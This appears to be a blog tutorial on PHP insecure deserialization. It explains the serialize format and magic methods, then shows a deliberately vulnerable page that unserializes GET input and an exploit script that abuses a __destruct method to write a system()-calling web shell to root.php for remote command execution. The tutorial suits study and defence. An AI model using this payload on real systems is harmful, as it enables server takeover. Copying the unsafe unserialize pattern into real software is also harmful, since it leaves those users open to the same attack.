In the information security world, we know that operating with untrustworthy content is a shot in the foot, and for [**Six Thinking Hats**](https://en.wikipedia.org/wiki/Six_Thinking_Hats), a frequent source of high-impact problems. Object serialization is no exception to this rule, and attacks against serialization schemes are innumerable. Unfortunately, developers attracted by the efficiency and ease of native and reflection-based serialization continue to build software based on these practices.

As common languages like java and python, php also supports serialization and issues of using serialization. but, what's serialize?
"**serialize()** php function returns a string containing a byte-stream representation of any value that can be stored in PHP". And, unserialize its the "reverse process". simply by converting bytes to object again. it takes a single serialized variable and converts it back into a PHP value, but, exploit deserialization, for example, in java depends on code flaw, the python don't, and in **PHP** depends on code flow inside magic methods.



PHP has serialized format when serialize object that can help unserialize method to identitfy each element and get code back. Let's take a look at [magic methods](http://php.net/manual/pt_BR/language.oop5.magic.php) used through (de)serialization.

* __sleep

* __wakeup

* __toString 

* __destruct 

**Sleep** it's used with serialization, and called when an object is serialized and must be returned to array. serialize checks if your class has a function with the magic name **sleep()**. If there is, the function is executed before any serialization. It can clear the object and must return an array with the names of all object variables that must be serialized. If the method does not return anything, then NULL is serialized and an E_NOTICE triggered.

**wakeup** its called when some object its deserialized.The purpose of wakeup is to resume any database connection that may have been lost during serialization, and perform other reboot tasks.

**tostring** uses object as string but also can be used to do something like read files. it allows a class to decide how to behave when converted to a string.This method needs to return a string, otherwise an error level E_RECOVERABLE_ERROR is generated.

**destruct** The destructor will be called even if the script is terminated using exit(). Calling exit() on a destructor will prevent all other shutdown routines from executing.

![output](/assets/images/ss1.png)


**O:7:"example":1** tells us there are objects having length 7 named example and has one property. **s:1:"x";s:18:"Just a simple text";** hat property inside object has string and has length 1 and named "x" this part tells us to create variables without initializing and **s:18:"Just a simple text"** it var with initializing and string has length 18.

# Exploitation

now, let's see how it works in the practice of exploration.

lets write 3 files.


```
<?php

include 'Magic.php';
$x = unserialize($_GET['content']);
echo '<h1>'.$x;
?>
```

---

```
<?php
class exploit
{
	public $filename = 'example.txt';
	public $content = 'lynfs';
	public function __destruct()

	{
		file_put_contents($this->filename, $this->content);
	}
}
?>
```

---

and the exploit:

```
<?php

include 'Magic.php';
$x=new exploit();
$x->filename="root.php";
$x->content='<?php echo system($_GET[\'pwn\']); ?>';
echo serialize($x);
?>
```

* 1st its the "main". the guy that uses our unserialized object to write our shell.
* 2nd its it write to file. you can see it has destruct and inside function to write to file.cuz if we control whats sends to deserialization process, we can abuse and write a exploit code. 
* and finally, our exploit code. first, we include the Magic.php ( second code ) cuz it has magic method **destruct** and create object from class exploit and initialize file name what file we want named and content to PHP our shell and finally serialize it.

now, lets run it.

![output-exploit](/assets/images/xplout.png)

now, sending our exploit output for serialized object, it will be unserialized.

![send-xpl-out](/assets/images/infoout.png)

as u can see, no errors. lets check our directory:

![sucess-shell-out](/assets/images/shellmade.png)

and there is our shell "root.php". using the $_GET param to get rce:

![sucess-shell-run](/assets/images/end.png)

got it!

---

### References:

* [Php magic methods](http://php.net/manual/pt_BR/language.oop5.magic.php#object.wakeup)
* [Php Serialize manual](http://php.net/manual/kr/function.serialize.php)

## Concluding remarks

so, thx google translate 4 the support, its kinda hard to learn korean in 24hours ( LOL ). I hope somehow this post will be useful to you in life, or in some other world. Otherwise, **Lets [pwn](https://github.com/lynfs/writeups/tree/master/pwn) the world!**

